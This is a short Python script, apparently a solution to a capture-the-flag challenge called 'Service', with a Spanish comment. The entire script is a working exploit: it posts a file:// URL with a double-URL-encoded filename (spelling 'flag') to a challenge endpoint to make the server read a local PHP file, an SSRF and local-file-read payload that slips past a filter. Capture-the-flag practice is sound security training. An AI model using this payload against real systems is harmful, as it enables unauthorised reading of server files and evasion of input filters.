import requests

url = "http://localhost.cap.tf:20040/localhost.php"

# Esto para el reto de Service
data = {
    "url": "file:///var/www/html/%25%36%36%25%36%63%25%36%31%25%36%37service.php"
}

r = requests.post(url, data)

print(r.text)